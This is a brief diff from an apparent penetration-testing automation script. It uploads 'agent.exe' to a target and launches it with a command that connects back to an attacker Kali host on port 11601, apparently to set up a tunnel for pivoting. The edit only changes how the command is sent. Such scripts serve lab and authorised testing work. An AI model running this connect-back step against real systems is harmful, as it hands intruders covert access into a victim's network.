@@ -9,5 +9,5 @@ FILE="agent.exe"
 
 cmd_upload_file "${LOCATION}" "${FILE}"
 
-paste_command "${FILE_LOCATION} -connect ${KALI_IP}:11601 -ignore-cert"
-xdotool key Return
+execute_command "${FILE_LOCATION} -connect ${KALI_IP}:11601 -ignore-cert"
+create_new_line
